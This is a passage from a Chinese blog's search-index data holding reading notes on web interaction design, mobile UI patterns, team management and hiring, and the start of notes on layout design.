如果对象间的视觉关系很复杂，则使用插入条来表示放置位置，降低拖动带来的视觉干扰（想起了salesforce的一个反模式）； 对于父子关系，突出显示父对象，也可以表示放置位置（想起了iPhone播放图标进入某个文件夹中）； 悬停时显示提示，提高可发现性； 当对象被拖动3像素，或者鼠标按下超过0.5秒时，启动拖动； 与鼠标同步显示拖动对象（可以考虑右偏移+半透明，来解决可能遮住目标位置的问题）； 拖放操作 不要对拖动进行过度设计，一来其易发现性不好，二来其操作路线并不短，只是形象化方面比较突出，因此能简单化的绝对不要复杂化（例如“点赞”“收藏”等功能）； 记得提供可替代方案； 悬停时提供明确邀请提示；甚至在页面上放置一个说明也未尝不可，例如上传图片的操作； 拖放集合 将某些相关项集中保存到一个列表中，比如将商品加入购物车（感觉一个“加入购物车”的按钮的操作路径更短更快）； 提供可替代的方式； 当拖动启动时，突出显示可放置拖动项的区域； 提供备用提示，以便让用户发现可以使用拖动功能； 原理二：简化交互 上下文中的工具 内容即是界面，无需划定功能区，每个对象都可以直接操作； 费茨定律：到达目标的时间，是到达目标的距离和目标大小的函数；（因此，为了降低到达时间，应考虑缩短到达的距离，以及增加目标的大小）； 几种方式： 实时可见工具 优点：突出显示，明确邀请；易发现性好；缺点：页面可能比较拥挤； 适用场景：如果某个操作非常重要，则把它直接放在界面中（例如“赞”）； 注意事项：保持视觉干扰最小化，保持可见项目最少化； 通过按钮实现主要操作，通过链接实现次要操作；（前者目标更大，更吸引注意力） 悬停即现工具 可以减少视觉干扰；易发现性稍弱，故应尽量使用熟悉的方式来帮忙用户发现隐藏的工具（例如下拉箭头意味着更多功能，超链接意味着执行操作等）； 使用覆盖层显示附加信息或工具要额外小心，因为覆盖层可能会妨碍正常的导航或遮挡住重要的信息（如有可能，考虑使用嵌入层，或者在排版上预留空间用显示初始隐藏的工具链接）； 工具覆盖层在悬停时应立即激活，附加信息可以有0.5秒延迟，因为前者是操作，用户希望最短时间进行；后者是一种内容补充，用户不一定想知道，可能只是误触； 不要让用户为了搞清楚工具的含义而悬停鼠标（因此如果空间不是非常有限，或者图标非常不言而喻，则尽量使用文字来表示工具用途）； 保证页面布局不被悬停显示干扰出现抖动，因为这样会分散用户的注意力； 开关显示工具 如果操作不是常用主要功能，但又想为用户提供直接操作页面对象的便利时，可以使用一个开关来打开和关闭编辑； 尽量保持打开和关闭的对称性； 编辑和非编辑状态的过渡尽可能平滑稳定；即开关开启后，用户操作或不操作均可，不会困于其中导致必须操作； 级联递进工具 尽量将常用的操作，放在激活位置最近的地方，例如如果是放射圆盘，对于播放器，可以将播放按钮放在中心； 永远不要让目标太小，目标足够大才容易被注意到，也容易操作； 对于重要的操作按钮，可以提升其在级联菜单中的层次； 一般来说，最好避免使用级联，因为让用户执行过多的鼠标操作容易带来反感，而且用户也会感觉复杂度提升； 二级菜单 类似桌面程序的右键菜单，但这种模式的易发现性很差，因此不要通过它显示除备用命令以外的操作； 好处是可以应付批量编辑； 不要在与传统界面类似的场景下使用二级菜单，因此可能会与浏览器和用户习惯相冲突； 原理三：足不出户：为创造连续视觉感知的心流最高境界服务； 覆盖层 不要使用老式的弹出窗口，因为无论从速度、资源、外观等来看，都比不上覆盖层好用； 对话框覆盖层 使用亮盒效果强调模态特性或吸引用户的注意力； 避免使用不必要的对话框，以防打断用户的流程；（若非必要，慎用） 在页内交互可以满足的情况下，不要使用覆盖层； 尽量不要使用JS的警告框，因为各浏览器的样式不统一； 详情覆盖层 使用详情覆盖层显示详细信息，避免用户打开新的页面； 悬停激活的场景，建议有0.5秒的延迟，避免地雷阵； 悬停激活，移开关闭（开启与关闭的对称性）； 如果想确认用户更明确的意图后再展示详情页，则可以使用点击，但需要显示点击的入口，例如一个“更多内容”的链接； 输入覆盖层 使用输入覆盖层简化表单的外观，帮助信息只在覆盖层中显示； 表单字段与覆盖层中的字段，可以加以区分，例如加粗的外框； 用户点击任何其他地方都可以退出覆盖层，同时捕捉TAB事件； 嵌入层：好处是可以保持上下文，像打开一个抽屉一样，然后用完还可以关上； 对话框嵌入层 可以用来实现页面自定义，这样既可以调整页面，又可以马上看到结果； 建议使用快速的滑动动画，免得打开太生硬； 一般用来显示一些不太重要的，不属于页面主流程的工具或操作（如果是主要的操作，则应该放在外面，方便快速点击，提高易发现性）； 列表嵌入层 列表是使用嵌入层的理想场所； 如果列表项的其他项作为上下文有助于用户理解可见的嵌入层，则应该使用列表嵌入层（如果组合的搜索条件）； 可以避免用户打开新页面或新覆盖层来查看细节信息； 如果空间大小有限，则每次只展开一项，每当有新一项打开时，缩起隐藏其他项； 在显示并列性内容时，可以一次打开多个项（例如搜索条件的筛选）； 详情嵌入层 可以在上下文中显示附加信息，且不会遮挡其他信息； 可以避免悬停与遮挡的反模式； 关闭嵌入层的操作要简单（考虑对称方式）； 标签页 可以用标签页在当前页面中，显示更多的附加信息； 避免在一个页面中使用多组标签页；如果确实需要使用，则内容区域在视觉上要有所区分； 最重要的内容放在第一项，因为其他项打开的机率会逐渐减小； 一般通过鼠标单点来激活TAB标签（有时候意外划过，导致启动TAB会让人感觉意外，不过如果是延迟0.5秒呢？）；除非其他标签的内容很重要，才使用悬停，帮助用户更快的发现其他重要的内容； 虚拟页面 虚拟滚动 适合显示搜索结果，不太适合显示邮件或者任务，因为前者用户不需要查看所有结果，但后者一般用户需要查看到底； 保证用户随时知道自己的位置，告诉他们滚动后呈现的数据范围； 在用户等待数据加载期间给出反馈； 可以既定的数据集，可以创造一个完全加载状态的假象（有利于滚动条的定位和暗示）； 对于搜索结果，可以随着滚动持续扩展虚拟空间 为用户提供好的往返导航的体验，比如隐喻有限的空间，方便其操作定位； 内置分页 内置分页可以呈现自然的“分块”效果；同时也能保证切换页面时的平滑流畅的体验； 正确处理“后退”按钮，让后退按钮对分页有效；（是否可以用局部的上一页与下一页按钮？） 只刷新“虚拟页面”，则不是整个页面； 以渐进加载的方式，向虚拟空间中加载更多的内容，而不是一次加载，不然当结果很大时，会很慢； 滚动分页：传送带 特点：以动画方式滚进视图；非常适合显示有视觉差异的内容，尤其是有图片的类型；（如果没有差异，用户不能立即分辨出内容之间的区别，显得单调无聊，浏览效率也比较低，此时用列表浏览可能更好） 一般来说，传送带左端的内容优先级更高，用户更经常访问，右端的访问概率逐渐降低；故传送带适合有显示优先级的内容； 如果要显示的内容很多，需要用户浏览，则传送带的浏览效果较低，并不方便； 一般内容要够大，内容间的留白也要大一些，以便区分； 将往返箭头放在一起虽然会方便操作，但不容易被发现，因为用户的心理预期经常是放在两端； 虚拟摇摄 可以作为滚动无穷大的2D画面的替代手段；（昨晚在TED看见了一个新式的图片浏览技术，即是用摇摄的办法；不过其最牛逼之处还在于将集合同一事物的不同用户的图片数据库，生成浏览集合拼贴） 尽量在摇摄中加入惯性，这样可以提高浏览效果，也更加接近现实效果； 伸缩式用户界面 通过虚拟的3D空间（增加深度一轴），来扩展显示更多的内容； 在移动画面时，可以考虑使用虚拟摇摄，例如谷歌地图 分页与滚动 如果内容实际上具有连续性，则使用滚动会比例好； 如果有批量操作功能，则滚动会比分页好，除非增加一个临时空间来存放（但不好处理全选后的滚动场景）； 对于临时数据，如搜索结果，则分页比较好，因为越后面的结果相关性越低，查看必要性越弱； 流程处理 魔法原理：一个摆脱技术驱动的技巧，问自己一个问题“能否考虑通过某种魔法来帮助用户快速神奇的完成任务？”（通过设计隐藏复杂性）； 交互式单页、嵌入式部件 将多个过程缩减在一页中处理，简化了步骤，例如淘宝购物的“颜色”“尺码”选择（实时显示各种有效选项）； 加快了用户的决策速度； 可以在上下文中显示预览； 对话框覆盖层 可以将多个步骤汇集到页面的上下文中；用户会感觉比使用多个页面更轻松； 亮盒效果有助于用户集中注意力；显示步骤进度，让用户有进度预期；由易入难，避免一开始吓跑了用户； 配置程序 即时反馈：让用户可以看到选择后的效果（感觉跟对话框嵌入层有点像）； 静态单页 如果过程比较复杂，可以考虑使用多页流程；如果步骤较少较简单，则应考虑使用静态单页（可以考虑渐进展示）； 使用视觉技巧减少用户心理上的步骤数（例如通过颜色对步骤二次分组）； 对用户当前的步骤及所剩步骤给出提示； 尽可能汇集默认选项，以简单整个流程； 把最简单的操作放在多步流程的前面； 原理四：提供邀请 邀请是引导用户进入下一个交互层次的提醒和暗示； 静态邀请 引导操作邀请 针对主要操作使用； 针对简单的1-2-3步骤使用； 把引导操作的区域设计得容易吸引用户注意力，但不干扰整个页面的视觉外观； 可以利用空白区域来引导用户操作； 可以利用看起来未完成的区域引导用户操作（但用户怎么知道它是未完成的呢？嗯，是个挑战） 漫游探索邀请 在重新设计站点或发布新站点，需要向用户介绍一系列新功能时使用； 尽可能密切漫游探索邀请与站点本身的联系（如果没有联系，干嘛出现？） 保持简明扼要，使其容易退出且容易重新启动； 不要指望通过它解决界面本身存在的问题（使用前记得先反省）； 保持漫游过程简单； 动态邀请 悬停邀请 当操作不如内容重要且需要操持界面整洁时使用； 可以通过改变光标、背景、显示工具提示等共同配合表明所邀请的操作； 在悬停邀请期间，尽量为用户提供单击后产生结果的预览； 在交互的不同阶段，尽量使用一些用户熟悉的元素，以助于用户的理解（如按钮、链接、下拉箭头和通用图标）； 预期功能邀请 把邀请安排在适当的上下文中，特别是要靠近交互的主体； 拖放邀请 拖放期间，尽可能利用多个趣味瞬间确保用户理解每一次邀请； 在位于可拖动区域时，应该改变光标形状； 为用户拖动明确提供一个可以抓握的空间； 推论邀请 类似代码自动补全； Sketchup的下一步功能提示； 更多内容邀请 可以利用悬停提示更多内容的存在，同时显示少量更多的内容； 原理五：巧用变换 把动画加入到应用程序中必须有一个理由，滥用反而会带来干扰； 变换模式 加亮和减暗，适用情形如下： 吸引用户注意力至界面中某一特定的部位； 提醒用户某个对象正处于交互的状态； 通过暗化减少界面中干扰视觉的元素； 表示界面中某一部分还未就绪，不能响应操作； 扩展与折叠，适用情形如下： 处理大量的内容或模块； 有效利用屏幕空间； 进一步展示列表项的细节； 辅助编辑内容 自恢复式淡出（删除-缺口-闭合），适用情形： 从列表或风格中删除一个对象； 形象的表示移动过程，哪里来； 表示拖动操作完成（即放下的对象从旧位置成功移到了新位置） 动画效果（运动的重量与加速度） 减少一半的规则（定义变换效果后，减少一半效果值会更加理想）； 如果直接移动对象到不同位置上让人容易困惑，则考虑使用动画展现过程； 聚光灯效果 表明某个对象的状态已经改变或已经更新为新的信息；（方便用户预览修改的效果） 变换的目的 增添魅力 让界面变化看起来更加优雅； 增进沟通 在视图变化时保持上下文 解释刚刚发生了什么 提示对象之间的关系 吸引用户的注意力 缩短时间感知 创建虚拟空间的假象 最佳实践 变化越快，表明事件越重要； 快速移动看起来比快速的颜色变化更重要； 朝向用户移动看起来比远离用户移动更重要； 非常慢的变化可以用在不干扰用户注意力的场景； 移动可以表达对象的位置有变化（听起来像是废话）； 正常情况下，应该对称性设计； 一定不要过渡使用变换（滥用效果的广告即是例证，变换应该是对用户操作后的反馈）； 尽量不要只依靠变换来表达界面的变化（那还有什么其他方法呢？） 让变换发生在用户视力的焦点区附近（这样比较容易引起用户察觉）； 花里胡哨的效果容易适得其反，干扰用户； 原理六：即时反应 查询模式 自动完成 智能的体现，减轻用户的输入负担，辅助用户更快的完成输入； 问题：多长时间内给出反馈？（我觉得取决于待搜索选项的多少，如果很多，则在用户停止输入时，再反馈；如果很少，则可以每输入一个字符就马上给出反馈） 问题：如何选项选项？当用户输入时，手是放在键盘上面的，所以应该支持快捷键，例如回车或者TAB等，减少用户再转移到鼠标操作； 问题：如何用户的输入涉及多个文本框，则应该根据逻辑关系进行配合，尽量减少用户的操作负担； 实时建议 针对大选项的情况，通过算法给出建议，从大概率上减少用户的输入负担 问题：应避免无效选项分散用户注意力，好的算法很重要； 由于猜不准用户的真实想法，所以实时建议应该做为辅助选项，而不是像“自动完成”做为直接的搜索关键词； 提供建议时，应该考虑给出上下文，这样用户易于理解建议的合理性； 由于面向未知，所以应在用户停止输入后，再显示建议，不然估计服务器吃不消； 实时搜索 利用用户输入关键词的时间，从服务器获得结果并给予展示，相对常规搜索，某些程度上节省了时间，因为用户有可能输入到一半的时候，就已经发现选项，不需要输入全部的关键词； 实时搜索的结果应该有摘要或部分内容预览，这样有利于用户判断结果是否自己想要的内容； 注意：提供太多的搜索结果，也会一定程度分散用户的注意力； 微调搜索 通过侧边栏显示多种筛选选项，来调整搜索结果的范围（个人经验证明，此种方式效果甚好，但也不一定在侧边，现在很多购物网站如淘宝京东是放在上边） 避免刷新整个页面，而应迅速显示筛选后的结果（此处估计需要用到缓存的办法）（同时考虑使用动画，视觉上面减少等待时间，过渡也更加平滑） 交互式单页也算是一种微调； 具有多种特征的商品，适合使用微调搜索； 适当延迟再触发搜索，因为有可能用户会勾选多个微调条件； 反馈模式 实时预览 可以有效预防用户犯错，如果出现错误，在第一时间即可以知道并修正（用户在这个过程中也会更有参与感）； 把预览放在操作的上下文中； 尽量让用户看到操作后对象的实时变化； 实时预览应避免页面切换； 预览的触发：最好能“每个字符”，其次“焦点离开”，再次“明确的邀请操作的按钮”； 渐进展现 从视觉上减少复杂度，避免用户被太多内容吓到，产生心理负担； 在必要时，才展示出帮助信息，界面更加清爽简洁； 可以用来引导用户完成较长的流程； 进度指示 从视觉上减少用户的时间感知； 使用各种指示器：进度条、百分比、菊花等有趣的循环动画；（我特别喜欢将内容分享至Evernote进行收藏的动画） 指示器应该放在发生操作的位置旁边；例如，焦点是输入框，则在输入框旁边显示；如果焦点是操作的结果，则在显示结果的区域显示； 尽可能用指示器显示实际的进度（微信的骗人的进度条也行），如果不行，才考虑使用循环动画； 定时刷新 适用持续动态有新内容的场景，比如新闻、社交状态等，目的是为了保持内容的新鲜； 但需要考虑易读性，所以也不能太频繁；而且当有新内容进入时，应该考虑使用动画让其显得不突兀； 也可以考虑为用户提供控制刷新的手段，例如邮件中的“收信”、“刷新”等按钮；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"移动应用UI设计模式","slug":"移动应用UI设计模式","date":"2016-04-11T12:50:00.000Z","updated":"2024-09-22T23:08:43.583Z","comments":true,"path":"2016/04/11/移动应用UI设计模式/","permalink":"http://example.com/2016/04/11/%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8UI%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"前言 各种不同系统和设备越来越具备了自己特点的规范标准； 至少花六周时间熟悉为之设计应用的设备；让自己的设计契合设备本身的特性和规范，保持用户使用习惯的一致性； 导航 主导航模式-全局导航（Persistent） 好处是显示出所有选项，结构一目了然，坏处是会受到屏幕空间的限制 全局还是瞬时，选择前应考虑如下问题： 应用层次是否扁平？应用的菜单分类是同级的还是有优先级的？主要类别是否只有少数几个，比如3-5个？ 是否需要菜单一直处于可见的状态以便用户快速访问？ 菜单分类有无状态指示，比如未读邮件数，或者未读消息数等？ 如果以上有一个答案回答“是”，则应考虑使用全局导航； 常见设计模式 跳板式（启动面板式） 优点：可放置多个选项（甚至分页）； 缺点：选项间没有优先级（可适当改进，例如磁贴的大小和颜色）；未直接呈现内容（多了一个层级）； 卡片式 优点：相对跳板，可以直接优雅的展示内容； 缺点：在定位到自己想查看的内容前，需要划过多张卡片以进行筛选，操作动作的次数相对跳板式会更一点； 适用场景：内容更加重要且是内容之间是同等优先级； 列表菜单式 优点：可放置较多选项，并支持较长的选项名称； 缺点：不能直接展示内容； 仪表盘式 优点：直接呈现汇总的数据结果，给用户提供关键信息； 缺点：非数据类则不可用； 适用场景：例如记帐或理财类应用； 陈列馆式（或者叫列表风格？） 优点：视觉效果突出，用图片做为内容呈现吸引注意力； 缺点：如果图片不能动态更新，则类似跳板式的磁贴效果了 适用场景：经常更新、视觉效果直观的无层级内容，例如新闻类、菜谱类应用； 选项卡菜单式 优点：选项一目了然，可以快速切换； 缺点：选项个数有限，最多5个；（如果超过5个，则可能需要引入一个“更多”的选项了） 适用场景：用户需要经常在选项间切换； 新生模式 折叠选项卡：可隐藏，可呼出（例如知乎的操作按钮，往下滚动时缩起，以便用户可以有更大的空间来阅读，也减少干扰；向上滚动时呼出，以便用户对文章进行操作）； 可配置选项卡：可增删选项，可拖动排序； 隐喻式 狙击游戏；碟片音乐；相机；文件夹；书架杂志架；航班时刻表； 需要谨慎的使用隐喻式，因为如果设计不好，则会成为反模式； 主导航模式-瞬时导航（Transient） 好处是打破了屏幕的空间限制，扩大了边界；优先呈现内容； 坏处是用户需要学习才能知道如何使用，且每次触发导航也需要更多的操作； 常见模式： 侧边抽屉式 优点：可放置丰富选项；可带结构；（功能强大，但建议不要放太多功能，而是专注于导航本身，例如结合spinner来提供下一级的内容分类）； 缺点：用户不易发现（可通过动画演示来培养用户习惯，先显示主页，之后自动弹出抽屉）； 下拉菜单式 优点：适用选项较少时使用； 缺点：不易发现； 注意事项： 无论什么手势，都能打开菜单，包括点击、轻滑、平移； 安卓的SPINNER控件用于同级细分，而非上级选项； 转盘菜单式 优点：新颖，有趣； 缺点：可放置的选项不多； 次级导航模式 所有主导航模式都可以用做次级导航模式，即可以用几种主导致模式来排列组合； 常见设计模式： 翻页式：有点像传送带 优点：可全屏呈现内容，减少干扰，更有沉浸感； 缺点：需要页面指示器告诉用户还有其他页面； 滚动选项卡式（或许叫滚动TAB更容易理解一些） 优点：可放置多个分类；每个分类占据尽量大的屏幕面积； 缺点：需要按顺序切换分类； 折叠菜单式（手风琴式） 优点：可放置丰富的内容，可带结构；方便快速切换； 适用场景：可只展现部分内容，如果用户有兴趣了解更多，再点击深入（例如应用中心的APP介绍，一开始只显示摘要，通过点击了解更多，会展示隐藏的折叠内容）； 注意事项：使用常见图标告诉用户可展开或折叠； 表单 目的：数据输入和配置（糟糕的设计经常导致用户中途放弃和流失）； 常见模式： 登录表单 尽可能少的输入； 自动获得焦点； 可显示&#x2F;隐藏密码的开关； 也可考虑使用设备账号做为用户名，而用户只需设置密码即可（例如取手机号）； 如有可能，无须登录，先行使用； 登录采用标准设计，减少花哨的创新，可以减少用户的学习成本，从而提高转化率； 注册表单 尽量少的要求用户提供信息； 用忘记密码功能来减少密码核对的两次输入； 如有需要，可在提交的时候，再提示核对用户名； 用户名输入时，实时反馈是否重名；（避免提交时才提示失败，从而给用户带来挫败感）；如果重名，猜测用户可能面临的原因，提供选项给用户选择，而不是让他重新开始（比如跳转到登录页面，或者可能遗忘密码，需要重置）； 去掉传统的姓、名分录，采用FULL NAME一次搞定； 垂直标签优于水平标签； 使用提示文字（水印式标签），减少标签名的空间；还可以加上动态悬浮效果，避免用户输到一半时忘记自己在输入什么信息； 提交后马上给予实时反馈结果；（避免用户不放心是否成功） 如有可能，每个字段的输入，都进行实时验证并给予反馈； 注册表单尽量简短，控制在一屏之内，同时操作按钮要放在可视范围内并突出显示； 个性化设置表单 尽量减少用户的操作工作量，有时候创新的交互会让用户感觉有趣，但如果工作量增加太多，则会带来厌恶； 多步骤表单 去掉进程栏（因空间有限）；可用步骤数字提示替代，显得更加简洁； 可考虑单页设计，同时配合选择性展开模式；（此模式可方便用户回顾之前的输入结果）； 去掉不必要的字段，最小化页面的数量和步骤数量； 可以步骤中间提供详情入口，以便用户预览前面的数据输入； 结账表单 同时提供注册、登录选项和游客模式，方便用户最快完成支付动作； 简化流程，比如单一结账页面； 提供省时的快捷方式（如果有什么信息是可以复用的，提供快捷方式，减少用户的手工输入，比如从通讯录调用电话、地址，用拍照扫描银行卡信息等） 提供快速结账的方式（如亚马逊的一键下单） 充分利用手机的一些原生技术，而不必照搬网页端的设计模式（比如二维码扫描、指纹识别）； 计算表单 注意表单的排版，包括对齐方式、字体、标签、颜色、按钮位置、视线路径等，它们都会影响易用性； 如有可能，尽量可视化输入结果； 不要求精细数据的时候，可以使用划块来输入粗略的数字； 搜索表单 尽可能减少输入，而是在搜索结果中提供筛选功能； 实时显示搜索结果的数目； 保存搜索选项，方便下次快速复用； 搜索条件尽量控制在一页内； 思考用户最常用的条件，预输入条件； 长表单 单页+滚动条，优于分页； 果断放弃没有必要的输入字段； 按钮位置遵守设计规范，以便相应设备的用户可以根据习惯快速定位； 表格 不要照搬PC端的设计；由于空间有限，需要更加严格的审视哪些信息是用户真正需要关注的（不要盲目猜测，而应该通过测试来验证）； 常见模式 基本表格 不要使用深色的网格线； 如果不使用垂直分隔线，则应确保列对齐； 文字左对齐，数字右对齐； 如果一屏内要显示大量信息，则采用非基本表格的形式； 无表头表格 适用内容本身可以自说明自己是何信息的场景，例如图片，关键字等；突出显示关键字； 优点：更加简洁； 技巧： 如果详情信息不多，可考虑使用嵌入式显示，避免用户跳转页面； 去除一切多余的噪音，例如毫无意义的图标、边框等视觉元素，精确对齐，以方便浏览； 对于次要信息，用较淡的颜色、较小的字体显示； 重要的信息不超过两项，如果太多，反而失去了重点； 固定列表格 适用：需要展示较多列信息的场景； 默认显示最重要的列；同时注意提示用户可以左右划动，比如故意半露半遮部分信息； 固定列边缘采用阴影； 概览加数据型表格 适用：用户想知道趋势的场景，例如财经，天气等； 如果概览图表太大，则可以考虑采用逐级深入的方式来显示余下信息； 行分组表格 优点：更方便阅读； 从视觉上将汇总行和其他行区别开来，一般来说汇总行较窄些，字体颜色浅一些； 带有视觉指标器的表格（即图标） 如果视觉指示器不能提升信息显示效果，则宁可不用，因为它会造成干扰； 可编辑表格 适用：就苹果、谷歌、微软三家的电子表格独有，其他应用一般都没有这个功能（这个功能其实很难设计，尤其在移动设备上更甚，投入产出比不高）； 注意事项： 清晰显示选中的单元格、行或列； 如果单元格有特定格式，例如日期&#x2F;颜色，则提供对应的适当的编辑器； 除非编辑后出现错误，不然不需要每次的编辑都提供确认反馈，等最后保存整个文件时再确认即可； 如果需要批量数据输入，或者可能需要大量的编辑工作，避免使用本模式；（因为效率和体验很差，与其如此，还不如让用户去PC端编辑）","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"重新定义团队","slug":"重新定义团队","date":"2016-04-04T07:37:00.000Z","updated":"2024-09-22T23:11:55.676Z","comments":true,"path":"2016/04/04/重新定义团队/","permalink":"http://example.com/2016/04/04/%E9%87%8D%E6%96%B0%E5%AE%9A%E4%B9%89%E5%9B%A2%E9%98%9F/","excerpt":"","text":"成为一名创始人 要有创始人的心态，不一定真的要去创建一家公司，即使在一个小团队内也可以； 把自己看做是一名创造人，并像创始人一样行动； 文化可以将战略像早餐一样吃掉 一项有意义的使命； 宽泛一些，不要局限于客户，因为客户会变，而且有少数客户也不一定是好人； 在内心深处，每个人都想要找到工作的意义； 让员工与他们帮助的人会面，是一项很有效的激发意义的办法； 如果相信员工，就不必害怕跟他们分享信息； 保持透明； 我们所有人都想掌握自己的命运； 允许每一个人发声；毫无保留的说出他们的观点； 打造了不起的文化 将工作看做是一种命运的召唤，而且工作要有富于意义的使命； 给人员工稍多于你舒适区的信任、自由和自主权；如果你没有感到紧张，可能是因为你给的还不够多； 关于招聘 在资源有限的情况下，把人力资源的费用首先投入到招聘上； 慢慢来，只聘用最优秀的人；聘用那些在某些特定方面比你更优秀的人才 不要让经理独立做团队人员聘用的决策； 搜寻最优人才 详细说明寻找人才的标准，并根据这个标准找到最优秀的被推荐人； 使招聘成为每个人的工作，让员工帮忙推荐优秀的人才； 可以考虑尝试一些疯狂的主意，以便引起一些优秀人才的注意力； 不要相信你的直觉 预测某人未来的工作表现的几种较有效的方法： 样例测试（29%）：一些在实际工作中发生的问题 一般认知能力测试（26%）： 结构化测试（26%）：行为测试（过去的某些行为）和情境测试（某些虚拟情境下的处理方式） 尽责性（10%） 领导力； 网上可以找到一些结构化测试样题，稍加修改，即可以成为面试题目； https://www.va.gov/pbi/questions.asp 面试反馈意见包括：对某个特性的评估，面试问题，应聘者的答案，面试官对答案的评估； 特性有：一般认知能力、领导力、尽责性、职务相关知识； 每一项特性至少有两名面试官独立做出评估； 每名面试官不一定需要评估所有特性； 如何做到： 设定高质量的招聘标准； 主动出击寻找潜伏的优秀人员； 客观的评估； 给应聘者一个加入的理由； 授权于员工 消除地位象征； 依靠数据而不是经理的想法来做出决策； 探寻方法，让员工塑造自己的工作和公司； 高期待：决策由层级最下面的员工进行制定；（除非基于同样数据，上一层会做出不同的决定，才值得上报） 为什么每个人都讨厌绩效管理 关注个人成长，而不是评分和奖励，以此改善绩效； 今天多数绩效评价体系的最大问题，在于它经常替代了那些关注员工成长的重要活动（人们期望实践一个简单的办法，然后坐等美好的结果发生）； 正确的设定目标：通过OKR来统一和分解团队的目标；目标必须具体、可度量、可检验；如果你达成所有结果，就能完成目标； 收集同事的反馈意见（利用团队的力量，而且这样也更加能够确保公平）；（询问哪件事情可以做得更好，以及一件采取不同做法会产生更大影响的事情；一次只专注一件，效果更好）； 通过校准流程确保考评结果（利用几名经理人都熟悉的人，来设定考评基准）；（5-10名经理人一组，对下面的50-100名员工做考评；开会前提示一些常见错误及修正的办法） 将奖励分配谈话，与员工发展谈话分开；（避免由自发的成长，变成由外在的激励所左右，切记） 5级绩效考评：需要改进、达到期望、超出期望、大幅超出期望，表现杰出（我个人倾向只用4级，因为后两个的区别有点模糊，而且减少级数也有利于更多关注两端）；（如果不将期望写出来，感觉很多所谓的期望可能会变得很主观，最好是在期初的时候，就提前先将期望写好，而且最好让被评估人知道，这样双方不容易就努力的方向产生分歧） 给经理与员工的面谈提供指南，使对话更加具体和切合实际； 通过集体智慧来做出升职决定；对于升职不成功的自荐，给予反馈意见； 管理团队的两端：最优员工和最差员工 助力有难处的员工； 将最优秀的人放在显微镜下进行观察；（一个有趣的做法：获奖条件是分享经验）； 利用调查和检查清单寻找真相，推动员工学习；（通过设置合适的题目，向员工调查其经理的表现，以便获得信息进行针对性改进）； 与人分享员工对你的反馈意见，以身做则采取行动解决问题，身先示范（去参加一些针对性的培训）； 打造学习型组织 进行刻意的练习，将课程分成易于消化的小块，给出明晰的反馈意见，并不断重复这个过程； 请最优秀的员工教学； 只在已经证明能够改变员工行为的课程上投入；（可以采用对照组实验） 不公平薪酬 努力工作，但不炫耀（用球棒砸烂宝马车的例子）； 在公司小的时候（几百人），降低薪水，给予期权；在公司大的时候，再考虑采用有吸引力的薪水； 全员持股，奖励突出贡献的每一个人，而不是只局限于高管； 以成就为荣，不以报酬为荣（确保程序公正，比如引入同事评价；幂律分布，对突出贡献的人员加大奖励力度；公开进行体验奖励，私下进行现金和股权奖励）； 创造易于传播爱的环境（让给他人点赞变得更加便利，而且可以公开展示）； 精心筹划却遭遇失败的仍然要奖励（要鼓励敢于冒险的文化）； 世界上最好的东西是免费的 利用人力资源项目达成三个目标：效率、社区意识、创新精神； 提高职业和个人生活的效率：可能并不需要付出费用，只是让它们变得触手可及即可，让员工免去寻找它们的时间； 社区意识：让家人了解自己的工作、随机午餐、兴趣群组和俱乐部；（促进员工之间的交流，激发更多思想） 推动创新：创造促进员工交流的环境、开展各种演讲（促进思想的流动）； 想办法说“好”，凡事先尝试，再改进调整，而不是一开始就拒绝； 员工最需要你的时候请伸出援手：保险计划、延长产假；（给予员工生活上的关怀） 助推 利用助推帮助员工变得更明智：助人与求助的调查与排名（员工只知道自己的排名）；（利用社会比较力量：人之好胜与利他的本性） 帮助新员工融入集体，事项清单： 进行一次角色与责任的讨论； 将新员工与另一名同事组成互帮互助组； 帮助新员工建立社交网络； 前6个月每月进行一次上岗情况检查； 鼓励畅所欲言； 通过清单，减少需要记忆的事项的数量，可以让人对更重要的事情保持关注； 利用助推帮助员工变得更加富有：定期储蓄计划，如年金等； 利用助推帮助员工变得更加健康：餐盘大小的例子 建议做很多小实验，证明有效后再推广； 谷歌的教训 透明的代价：不可避免可能会造成机密信息的泄露；如果出现这种情况，毫不留情的进行惩罚；透明带来的好处，远超过它的代价； 摒弃应得的权利：如果出现了滥用的情况，公开的提出来，引起大家的注意力，让小恶接受公众的质疑和思考，从而不再容易发生； 失败的绩效改革：当出现危机的时候，停下手里所有的工作，处理危机；越是危机的时候，越是赢得他人信任与尊重的关键时候； 珍视怪人：有时他们会给有一些预见性和启发性的问题和思考； 有的放矢：平衡个人自由和公司整体方向的关键在于透明；同时还要解释更广阔的背景； 搞砸的时候： 承认错误，坦诚面对错误； 吸取各方面的意见； 不管什么坏掉了，修好； 找出错误中的寓意，加以传播；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"管理","slug":"管理","permalink":"http://example.com/tags/%E7%AE%A1%E7%90%86/"}]},{"title":"版面设计的原理","slug":"版面设计的原理","date":"2016-03-22T12:44:00.000Z","updated":"2024-09-22T23:08:43.598Z","comments":true,"path":"2016/03/22/版面设计的原理/","permalink":"http://example.com/2016/03/22/%E7%89%88%E9%9D%A2%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%8E%9F%E7%90%86/","excerpt":"","text":"Step 1 建立条理（理距齐视，构线编字，格衡重心） 目的：运用视觉化的手段使作品具有条理性，降低读者的认知负担，不会被不重要的元素分散注意力，尽量在很短的时间内传达信息； 信息的整理：理解设计的意图，提取重要的元素，正确的布置，是设计的第一步； 理解：5W1H，何时，何地，何人，何事，为什么，如何做； 提取：给所有元素设定优先级；能够视觉化的元素尽量视觉化，一来有助于理解，二来更加生动； 布置：放大重要元素，缩小不重要元素，留白； 贴近和远离：将同类要素贴近配置，整理版面使其更容易阅读； 在第一步整理要素内，对于同类的要素，使用贴近处理，建立单独的整体感，可以更容易阅读和获取需要的信息； 